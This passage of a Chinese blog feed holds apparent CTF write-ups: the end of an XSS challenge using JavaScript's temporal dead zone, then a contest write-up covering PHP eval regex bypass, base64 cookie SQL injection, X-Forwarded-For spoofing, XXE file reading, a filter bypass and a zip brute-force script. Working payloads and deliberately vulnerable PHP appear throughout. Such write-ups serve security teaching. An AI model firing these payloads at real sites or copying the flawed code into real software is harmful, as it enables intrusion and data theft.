<li><p>这在<a href="https://html.spec.whatwg.org/multipage/scripting.html#restrictions-for-contents-of-script-elements" target="_blank" rel="noopener">HTML</a>标准中有提及</p>
</li>
</ul>
<pre><code class="html">&lt;script&gt;
    var example = &#39;Consider this string: &lt;!-- &lt;script&gt;&#39;;
    console.log(example);
  &lt;/script&gt;
&lt;body&gt;hi. bye.&lt;/body&gt;</code></pre>
<ul>
<li>在js代码中加入<code>&lt;!-- &lt;srcpit&gt;</code>会发生什么呢，可以观察到,<code>&lt;body&gt;</code>被当做js代码并入上一级的<code>&lt;srcpit&gt;</code>标签中。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200407/158624379728.png" alt="img"></p>
<ul>
<li>回到上面题目：<pre><code class="html">&lt;script&gt;
setTimeout(function(){
  try{
      return location = &#39;/?i_said_no_xss_4_u_:)&#39;;
      nodice=&lt;?php echo $xss; ?&gt;;
  }catch(err){
      return location = &#39;/?error=&#39;+&lt;?php echo $xss; ?&gt;;
  }
  },500);
&lt;/script&gt;
&lt;script&gt;
/* 
  payload: &lt;?php echo $xss ?&gt;
</code></pre>
</li>
</ul>
<p>*/<br></p>
<body onload="location="/?no_xss_4_u_:)"">hi. bye.<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
```

<ul>
<li>我们要直接bypass最后的那个<code>&lt;body&gt;</code>就可以在$xss中传入一个<code>&lt;!-- &lt;srcpit&gt;</code></li>
<li>那么如何输出构造xss这里？</li>
<li>这里第一个return肯定是不能让他执行的，否则他就会直接跳转。我们先来看一段代码。</li>
</ul>
<pre><code class="javascript">function foo() {
    try{
        return x = &#39;x&#39;;
        let x=1;

    }catch(err){
        return alert(1);
    }}
foo();</code></pre>
<ul>
<li>执行会发现弹框。这是为什么呢，前面我们说过let和var的区别，正因为let不能设置已经声明过的变量导致<code>try</code>中出错，跳转到<code>catch(err)</code>中执行了<code>alert</code>,但是为什么第一个return没有被执行跳转呢？</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200407/15862463309057.png" alt="img"></p>
<ul>
<li>难道是因为只要在代码块中出现错误就会跳转到<code>catch(err)</code>中，那么我们把代码改成</li>
</ul>
<pre><code class="javascript">function foo() {
    try{
        return x = &#39;x&#39;;
        print(s);

    }catch(err){
        return alert(1);
    }}
foo();</code></pre>
<ul>
<li>可以看到这次直接返回了x,并没有执行<code>catch(err)</code>内容。可以猜测这个和<code>let</code>有关。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200407/15862469661040.png" alt="img"></p>
<ul>
<li>我们再把<code>let</code>换成<code>const</code>呢？可以发现<code>alert</code>被执行了。那么我们可以知道<code>let</code>和<code>const</code>有一个共同的特点那就是<code>暂存死区</code>,因为let声明不会被提升到当前执行上下文的顶部。该变量属于从块开始到初始化处理的“暂存死区”。也就是说第一个<code>return</code>到<code>let</code>之间都是暂存死区。在程序的控制流程在新的作用域进行实例化时，在此作用域中用let、const声明的变量会在该作用域中先创建，但这个时候还没有进行词法绑定，没有进行对声明语句的求值运算，所以是不能访问的，访问会抛出错误。所以let可以简单理解为最先执行，但是没有将其与变量绑定，所以后面return访问时候就抛出了错误，导致了catch被执行。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200407/15862475313345.png" alt="img"></p>
<ul>
<li>在mozilla就有这么一个例子（<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/let" target="_blank" rel="noopener">直通车</a>），所以导致xss被执行。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200409/15863628386804.png" alt="img"></p>
<h3 id="exp-综上所述"><a href="#exp-综上所述" class="headerlink" title="exp 综上所述"></a>exp 综上所述</h3><pre><code class="http">http://127.0.0.1/xss.php?xss=alert(1);let%20location=1;%0a%3C!--%3Cscript</code></pre>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>第二届海啸杯网络安全挑战赛write up</title>
    <url>//articles/d4c65925ba.html</url>
    <content><![CDATA[<p>s</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="1-1-？"><a href="#1-1-？" class="headerlink" title="1+1=？"></a>1+1=？</h4><ul>
<li><p><strong>题目描述</strong>：</p>
<p>​    这是一道小学计算题</p>
<hr>
</li>
<li><p><strong>考点</strong></p>
<ul>
<li>正则绕过</li>
</ul>
<hr>
</li>
<li><p><strong>难度</strong></p>
<p>​    ★★★★</p>
<hr>
</li>
<li><p><strong>题目源码</strong></p>
</li>
<li><p>index.php</p>
<pre><code class="php">&lt;?php
error_reporting(0);
function get_the_f2ag(){
      echo file_get_contents(&#39;flag.php&#39;);
}
</code></pre>
</li>
</ul>
<p>@$gf = $<em>GET[‘s’];<br>if (!$gf ){<br>    highlight_file(<em>_FILE</em></em>);<br>}</p>
<p>if(strlen($gf)&gt;40){<br>    die(‘One inch long, one inch strong!’);<br>}<br>if(!preg_match(‘/[0-9]|~|^|$|[A-Z|m-s|w-z|i-k|b-d|||{}|%]/‘, $gf)){<br>    eval($gf);<br>}else{<br>    die(‘No!’);<br>}</p>
<p>?&gt;  </p>
<pre><code>- waf.php

```php
&lt;?php
error_reporting(0);
if(!preg_match(&#39;/eval/&#39;, $_GET[&#39;s&#39;])&amp;&amp;isset($_GET[&#39;s&#39;])){
    foreach (get_defined_functions()[&#39;internal&#39;] as $fun) {
        if(preg_match(&#39;/&#39;.$fun.&#39;/m&#39;, $_GET[&#39;s&#39;])){
            die(&#39;NO Hacking!&#39;);
        }
    }
}
?&gt;</code></pre><ul>
<li>.user.ini</li>
</ul>
<pre><code class="php">auto_prepend_file=waf.php</code></pre>
<hr>
<ul>
<li><strong>解题思路</strong></li>
</ul>
<p>第一个正则过滤了大部分函数但是eval并没有过滤，第二个正则过滤了数字、取反、异或、$符、大写字母、部分小写字母以及其他字符。题目的整体意思是构造出<code>get_the_f2ag();</code>让eval去调用。但是<code>get_the_f2ag()</code>含有数字，那么就需要想办法把数字构造出来。</p>
<p>其中!a=0那么!!a=1,两个相加再拼接成字符串</p>
<pre><code class="php">&#39;get_the_f&#39;.(!!&#39;a&#39;%2b!!&#39;a&#39;).&#39;ag();&#39;</code></pre>
<p>那么需要执行两次php代码，那么最终payload</p>
<pre><code class="php">?s=eval(&#39;get_the_f&#39;.(!!&#39;a&#39;%2b!!&#39;a&#39;).&#39;ag();&#39;);</code></pre>
<p>这里注意的是加号需要转码为url编码，因为加号在url中是空格。</p>
<ul>
<li><strong><em>flag</em></strong></li>
</ul>
<pre><code>flag{i_want_to_have_a_girlfriend_666}</code></pre><h4 id="宁静致远"><a href="#宁静致远" class="headerlink" title="宁静致远"></a>宁静致远</h4><ul>
<li><p><strong>题目描述</strong>：</p>
<p>The quieter you become. The more you are able to hear.</p>
<hr>
</li>
<li><p><strong>考点</strong></p>
<p>cookie编码（base64）后的注入</p>
</li>
<li><p><strong>难度</strong></p>
<ul>
<li>★★</li>
</ul>
<hr>
</li>
<li><p><strong>题目源码</strong></p>
</li>
</ul>
<pre><code class="php">&lt;?php
date_default_timezone_get(&#39;Asia/Shanghai&#39;);
header(&quot;Content-Type:text/html;charset=utf-8&quot;);
$server=&#39;127.0.0.1&#39;;
$username=&#39;root&#39;;
$passwd=&#39;root&#39;;
$db=&#39;ctf&#39;;
$conn =  new mysqli($server,$username,$passwd,$db);
if($conn-&gt;connect_error&lt;&gt;0){
    die(&quot;sql error&quot;);
}else{
    $conn-&gt;set_charset(&quot;utf8&quot;)or die(&quot;设置字符失败&quot;.$conn-&gt;error);
}

setcookie(&quot;hexo&quot;, &quot;MQ==&quot;, time()+360);
$user = $_COOKIE[&#39;hexo&#39;];
$check = base64_decode($user);
$sql = &quot;select * from user where id = &#39;$check&#39;&quot;;

$result = $conn-&gt;query($sql);
$info = $result-&gt;fetch_array(MYSQL_ASSOC);
echo $info[&#39;user&#39;];
?&gt;</code></pre>
<ul>
<li><p><strong>解题思路</strong></p>
<ul>
<li><p>抓包后发现cookie有个hexo参数十分奇怪.base64编码，解码后发现是1，于是sql联合注入</p>
</li>
<li><pre><code class="sql">hexo=-1&#39;union select 1,(select group_concat(flag)from ctf.flag) -- </code></pre>
</li>
<li><p>base64编码传入</p>
</li>
<li><pre><code class="cookie">hexo=LTEndW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZylmcm9tIGN0Zi5mbGFnKSAtLSA=</code></pre>
</li>
</ul>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190928/1569639959188.png" alt="img"></p>
<hr>
<h4 id="Gzmtu学生？"><a href="#Gzmtu学生？" class="headerlink" title="Gzmtu学生？"></a>Gzmtu学生？</h4><ul>
<li><p><strong>题目描述</strong>：</p>
<p>你是Gzmtu的学生吗？</p>
<hr>
</li>
<li><p><strong>考点</strong></p>
<ul>
<li>未授权访问，ip伪造</li>
</ul>
<hr>
</li>
<li><p><strong>难度</strong></p>
<p>​    ★</p>
</li>
</ul>
<hr>
<ul>
<li><p><strong>题目源码</strong></p>
<pre><code class="php">&lt;?php
setcookie(&quot;user&quot;, &quot;0&quot;, time()+360);
if(@$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]!=&quot;127.0.0.1&quot;){
    die(&quot;u no student in Gzmtu&quot;);
}else{
    if($_COOKIE[&#39;user&#39;]==1){
     echo &quot;flag{welcom_to_GZMTU_56456s4awdawdafafa}&quot;;        
    }else{
        die(&quot;u no admin!&quot;);
    }    
}
?&gt;</code></pre>
</li>
<li><p><strong>解题思路</strong></p>
<p>xff伪造ip为127.0.0.1然后改cookie未授权访问即可获取到flag</p>
</li>
<li><p><strong>flag</strong></p>
<pre><code>flag{welcom_to_GZMTU_56456s4awdawdafafa}</code></pre><hr>
</li>
</ul>
<h4 id="Who-are-you-？"><a href="#Who-are-you-？" class="headerlink" title="Who are you ？"></a>Who are you ？</h4><ul>
<li><p><strong>题目描述</strong>：</p>
<p>XXE</p>
<hr>
</li>
<li><p><strong>考点</strong></p>
<ul>
<li>XXE外部实体注入</li>
</ul>
<hr>
</li>
<li><p><strong>难度</strong></p>
<p>​    ★★</p>
</li>
</ul>
<hr>
<ul>
<li><strong>题目源码</strong><pre><code class="php">&lt;?php
libxml_disable_entity_loader(false);
$data = @file_get_contents(&#39;php://input&#39;);
$resp = &#39;&#39;;
//$flag=&#39;flag{79d10626-d27f-4569-a629-c9606d0378f2}&#39;;
if($data != false){
  $dom = new DOMDocument();
  $dom-&gt;loadXML($data, LIBXML_NOENT);
  ob_start();
  $res  = $dom-&gt;textContent;
  $resp = ob_get_contents();
  ob_end_clean();
  if ($res){
      die($res);
  }
</code></pre>
</li>
</ul>
<p>}<br>?&gt;<br><!DOCTYPE html></p>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <title>welcome</title>
    <link rel="stylesheet" href="./style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

</head>
<body class="contactBody">
<div class="wrapper">
    <div class="title">


<pre><code>&lt;/div&gt;


&lt;form method=&quot;post&quot; class=&quot;form&quot;&gt;
    &lt;h1 id=&quot;title&quot;&gt;请输入姓名&lt;/h1&gt;
    &lt;br/&gt;
    &lt;br/&gt;
    &lt;br/&gt;
    &lt;input type=&quot;text&quot; class=&quot;name entry &quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Your Name&quot;/&gt;
&lt;/form&gt;
&lt;button class=&quot;submit entry&quot; onclick=&quot;func()&quot;&gt;Submit&lt;/button&gt;

&lt;div class=&quot;shadow&quot;&gt;&lt;/div&gt;</code></pre></div>

</div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<script type="text/javascript">
    function play() {
        return false;
    }
    function func() {
        // document.getElementById().value
        var xml = '' +
            '<\?xml version="1.0" encoding="UTF-8"\?>' +
            '<feedback>' +
            '<author>' + document.getElementById('name').value+ '</author>' +
            '</feedback>';
        console.log(xml);
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
            if (xmlhttp.readyState == 4) {
                // console.log(xmlhttp.readyState);
                // console.log(xmlhttp.responseText);
                var res = xmlhttp.responseText;
                document.getElementById('title').textContent = res
            }
        };
        xmlhttp.open("POST", "index.php", true);
        xmlhttp.send(xml);
        return false;
    };
</script>


```

<ul>
<li><p><strong>解题思路</strong></p>
<p>xxe外部实体注入+伪协议读取源码</p>
<pre><code class="http">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;

&lt;feedback&gt;
&lt;author&gt;&amp;xxe;&lt;/author&gt;
&lt;/feedback&gt;</code></pre>
</li>
<li><p><strong>flag</strong></p>
<pre><code>flag{79d10626-d27f-4569-a629-c9606d0378f2}</code></pre></li>
</ul>
<h4 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h4><ul>
<li><p><strong>题目描述</strong>：</p>
<p>EasyWeb</p>
<hr>
</li>
<li><p><strong>考点</strong></p>
<ul>
<li>双重绕过</li>
</ul>
<hr>
</li>
<li><p><strong>难度</strong></p>
<p>​    ★★</p>
</li>
</ul>
<hr>
<ul>
<li><strong>题目源码</strong></li>
</ul>
<pre><code class="php">&lt;?php
//flag in flag.php
@$payload = $_GET[&#39;s&#39;];
if(!isset($_GET[&#39;s&#39;])){
    highlight_file(__FILE__); 
    die();
}
$payload=str_replace([&#39;php&#39;,&#39;flag&#39;], &#39;&#39;, $payload);
if(!empty($payload)&amp;&amp;preg_match(&#39;/flag/&#39;, @$_GET[&#39;x&#39;])==md5(@$_GET[&#39;x&#39;])&amp;&amp;!empty($_GET[&#39;x&#39;]))
    echo file_get_contents($payload);

?&gt;</code></pre>
<ul>
<li><strong>解题思路</strong></li>
</ul>
<pre><code>index.php?s=flaflagg.phflagp&amp;x[]=1</code></pre><ul>
<li><strong><em>flag</em></strong></li>
</ul>
<pre><code>flag{Hello_Gzmtu_66666666666}</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><ul>
<li><p><strong>题目描述</strong>：</p>
<p>this is a pic.</p>
<hr>
</li>
<li><p><strong>考点</strong></p>
<ul>
<li>base64编码解码</li>
</ul>
<hr>
</li>
<li><p><strong>难度</strong></p>
<p>​    ☆</p>
</li>
</ul>
<hr>
<ul>
<li><strong>题目源码</strong></li>
</ul>
<pre><code>iVBORw0KGgoAAAANSUhEUgAAAfQAAADICAIAAACRe4S/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAGjWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDIgNzkuMTYwOTI0LCAyMDE3LzA3LzEzLTAxOjA2OjM5ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgKFdpbmRvd3MpIiB4bXA6Q3JlYXRlRGF0ZT0iMjAxOS0wOC0xN1QyMzoyNjo0NiswODowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxOS0wOC0xN1QyMzoyNzo0MCswODowMCIgeG1wOk1vZGlmeURhdGU9IjIwMTktMDgtMTdUMjM6Mjc6NDArMDg6MDAiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NDk4MTViMzgtZjA2YS1mNTQ4LWFhY2YtNDljOTgzMGIyNGMzIiB4bXBNTTpEb2N1bWVudElEPSJhZG9iZTpkb2NpZDpwaG90b3Nob3A6YjE2Yzg5ZTQtMzU1NC00MDRmLWFlYjEtMDY1M2U0OGFiYzBiIiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6ODk3ODcyOTYtMmY0Ni1hOTQ4LWJiYmUtZWQ0MjFmNzcwMzFlIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyI+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNyZWF0ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6ODk3ODcyOTYtMmY0Ni1hOTQ4LWJiYmUtZWQ0MjFmNzcwMzFlIiBzdEV2dDp3aGVuPSIyMDE5LTA4LTE3VDIzOjI2OjQ2KzA4OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgKFdpbmRvd3MpIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDpmODIzZDcwNi0zMWI1LTBlNDYtOTdjYi0wMjE2ZWNiZjZjNTQiIHN0RXZ0OndoZW49IjIwMTktMDgtMTdUMjM6MjY6NDYrMDg6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDQyAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249InNhdmVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOjQ5ODE1YjM4LWYwNmEtZjU0OC1hYWNmLTQ5Yzk4MzBiMjRjMyIgc3RFdnQ6d2hlbj0iMjAxOS0wOC0xN1QyMzoyNzo0MCswODowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7heTAAAAAM1UlEQVR4nO3d73mi2hbHcXKf+x6mApkKZCqQqSCcCjQVxA7CVKCngmAFkgqCFQxWIFYwUEHu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</code></pre><ul>
<li><p><strong>解题思路</strong></p>
<p>base64解码保存为png图片即可出来flag</p>
<pre><code class="python">import base64
f = open(r&#39;flag.txt&#39;,&#39;r&#39;)

s = f.read()

print()
# coding: utf-8
f2 = open(r&#39;flag.png&#39;,&#39;w&#39;)
flag = str(base64.b64decode(s))
f2.write(flag)
f2.close()
f.close()</code></pre>
</li>
</ul>
<ul>
<li><p><strong><em>flag</em></strong></p>
<pre><code>flag{I_LOVE_CHINA}</code></pre><hr>
<h4 id="小明的求助"><a href="#小明的求助" class="headerlink" title="小明的求助"></a>小明的求助</h4></li>
<li><p><strong>题目描述</strong>：</p>
<p>小明女朋友发了个重要文件压缩包给他，在传输过程中发生了错误导致压缩包损坏，而且密码他只知道”hlqiou”加上4位数字，如果打不开这个文件他女朋友将离他而去，你能帮助他吗？</p>
<hr>
</li>
<li><p><strong>考点</strong></p>
<ul>
<li>文件头修复</li>
<li>安全编程</li>
</ul>
<hr>
</li>
<li><p><strong>难度</strong></p>
<p>​    ★★</p>
</li>
<li><p><strong>解题思路</strong></p>
<p>文件头损坏修复文件头为zip</p>
<p>编写解压脚本爆破压缩包</p>
</li>
</ul>
<pre><code class="python">  # -*-coding:utf-8-*-
  import zipfile
  import re


  def main():
      with zipfile.ZipFile(&#39;test/xiaoming.zip&#39;) as zFile:#创建ZipFile对象
          for i in range(1000,9999):
              password=&quot;hlqiou&quot;+str(i)
              try:
                  zFile.extractall(path=&#39;./test/flag&#39;, pwd=bytes(password, encoding=&quot;utf8&quot;))
                  print(password)
              except Exception as e:
                  pass


  if __name__==&#39;__main__&#39;:
      main()
</code></pre>
<ul>
<li><strong><em>flag</em></strong></li>
